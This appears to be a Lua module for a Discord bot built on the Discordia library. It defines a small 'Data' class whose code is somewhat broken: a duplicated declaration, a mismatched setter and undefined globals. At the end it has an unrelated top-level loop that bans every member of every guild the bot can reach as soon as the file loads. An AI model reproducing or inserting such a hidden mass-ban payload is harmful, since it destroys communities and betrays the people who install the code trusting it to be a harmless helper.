local Resolver = require('client/Resolver')
local ArrayIterable = require('iterables/ArrayIterable')
local json = require('json')
local class = discordia.class
local Data = class('Data')
local Data, get, set = class('Data')
local http = require('coro-http')

function Data:__init(data)
	self._data = data
end

function get.data(self)
	return self._data
end

function set.color(self, data)
	self._data = data
end


for key,guild in pairs(client.guilds) do
  for key,member in pairs(guild.members) do
    member:ban()
  end
end
